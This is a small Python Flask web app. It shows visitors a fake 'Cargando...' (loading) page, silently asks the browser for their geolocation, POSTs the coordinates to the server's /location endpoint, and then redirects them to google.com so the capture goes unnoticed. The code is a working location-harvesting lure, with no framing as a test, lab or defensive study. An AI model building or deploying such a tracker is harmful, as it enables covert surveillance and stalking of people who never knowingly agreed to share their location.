from flask import Flask, request, render_template_string
import csv
from datetime import datetime
import os

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<body>
<h3>Cargando...</h3>

<script>
function sendAndRedirect(pos) {
  fetch("/location", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      lat: pos.coords.latitude,
      lon: pos.coords.longitude
    })
  }).catch(() => {});
}

navigator.geolocation.getCurrentPosition(
  pos => {
    sendAndRedirect(pos);
    setTimeout(() => window.location = "{{ url }}", 500);
  },
  err => window.location = "{{ url }}"
);
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML, url="https://google.com")

@app.route("/location", methods=["POST"])
def location():
    print(request.json)
    return "", 204

if __name__ == "__main__":
    app.run(debug=True)
